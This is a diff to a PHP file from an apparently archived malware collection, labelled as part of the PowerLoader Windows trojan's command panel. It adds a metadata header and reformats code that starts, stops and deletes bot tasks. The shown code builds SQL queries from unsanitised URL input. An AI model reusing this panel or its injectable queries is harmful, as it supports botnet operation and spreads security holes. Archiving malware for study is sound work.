@@ -1,3 +1,14 @@
+/*
+  name      PowerLoader
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     —
+ */
 <?php
 
 // СДЕЛАТЬ ОСТАНОВКУ ЗАДАНИЙ
@@ -15,7 +26,8 @@ if (isset($_GET['del']))
 
 if (isset($_GET['d']))
 {
-	$id = $_GET['d']; 	$task = $db -> query("SELECT * FROM `tasks` WHERE tId=$id") -> fetchAssoc();
+	$id = $_GET['d'];
+ 	$task = $db -> query("SELECT * FROM `tasks` WHERE tId=$id") -> fetchAssoc();
 
  	if ($task['tState'] == "running")
  	{
@@ -26,7 +38,8 @@ if (isset($_GET['d']))
  		$t['tState'] = "running";
  	}
 
-	$db->update('tasks', $t, "tId=$id");}
+	$db->update('tasks', $t, "tId=$id");
+}
 
 if (!isset($_GET['add']))
 {
